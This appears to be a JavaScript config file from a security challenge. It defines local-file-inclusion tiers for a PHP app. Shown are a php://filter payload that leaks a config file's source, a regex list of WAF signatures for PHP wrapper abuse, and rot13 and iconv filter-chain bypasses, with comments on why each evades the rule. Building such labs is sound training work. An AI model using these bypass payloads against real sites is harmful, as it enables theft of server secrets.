// LFI — per-tier defence contract.
// T0: no defence; the canonical php://filter convert.base64-encode wrapper
//     exfiltrates the config source intact.
// T1: a signature WAF inspects the request URL and blocks the canonical
//     base64-encode filter expression. The puzzle stays solvable via
//     alternative php:// filter chains that obfuscate the file content with a
//     different reversible transform. ROT13 and the iconv UTF-16 transforms
//     both prevent PHP from parsing the include as PHP code (so the source
//     leaks rather than executes) and are invertible client-side.

const CONFIG_PATH = '/tmp/app-config.php'

function canonicalWrapper() {
  return `php://filter/convert.base64-encode/resource=${CONFIG_PATH}`
}

// Signature pool a real WAF might pack for PHP wrapper abuse. The
// canonical-blocking rule (base64-encode filter) is always pinned; the
// remainder are decoys drawn at random per deploy.
export const RULE_POOL = [
  { name: 'lfi-base64-encode-filter', pattern: 'convert\\.base64-encode', flags: 'i' },
  { name: 'lfi-data-uri-base64',      pattern: 'data:\\s*[\\w/+-]+\\s*;\\s*base64', flags: 'i' },
  { name: 'lfi-expect-wrapper',       pattern: 'expect:\\/\\/', flags: 'i' },
  { name: 'lfi-zip-wrapper',          pattern: 'zip:\\/\\/', flags: 'i' },
  { name: 'lfi-phar-wrapper',         pattern: 'phar:\\/\\/', flags: 'i' },
  { name: 'lfi-traversal-etc',        pattern: '\\.\\.\\/.*\\/etc\\/', flags: 'i' },
  { name: 'lfi-proc-self',            pattern: '\\/proc\\/self\\/', flags: 'i' },
]

// Bypass templates — alternative php:// filter chains that still exfiltrate
// the file's source through a transform that (a) is not matched by the pinned
// rule and (b) defeats PHP's parser so the include leaks instead of executing.
//   1. string.rot13 — letters are rotated, the `<?php` open tag becomes
//      `<?cuc`, so PHP does not enter parse mode; the source streams out
//      ROT13-encoded for the client to invert.
//   2. convert.iconv.utf-8.utf-16le — output gains a NUL byte after every
//      ASCII character, so `<?php` does not match the open-tag scan and the
//      source streams out as UTF-16LE bytes.
//   3. convert.iconv.utf-8.utf-16be — same trick with the opposite byte order.
export const BYPASS_TEMPLATES = [
  () => `php://filter/read=string.rot13/resource=${CONFIG_PATH}`,
  () => `php://filter/read=convert.iconv.utf-8.utf-16le/resource=${CONFIG_PATH}`,
  () => `php://filter/read=convert.iconv.utf-8.utf-16be/resource=${CONFIG_PATH}`,
  () => `php://filter/convert.iconv.utf-8.utf-16le/resource=${CONFIG_PATH}`,
]

export const defences = {
  0: {
    canonicalPayload: () => canonicalWrapper(),
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => canonicalWrapper(),
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

// Per-deploy WAF config. The pinned rule blocks the canonical
// convert.base64-encode filter; a random subset of decoy LFI-style rules is
// layered on top. Bypass templates are constructed so none of the rules
// (pinned or decoy) match — only the canonical filter name is signatured.
export function generateT1Config(rng = Math.random) {
  const required = ['lfi-base64-encode-filter']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const extraCount = 2 + Math.floor(rng() * (optional.length - 1))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
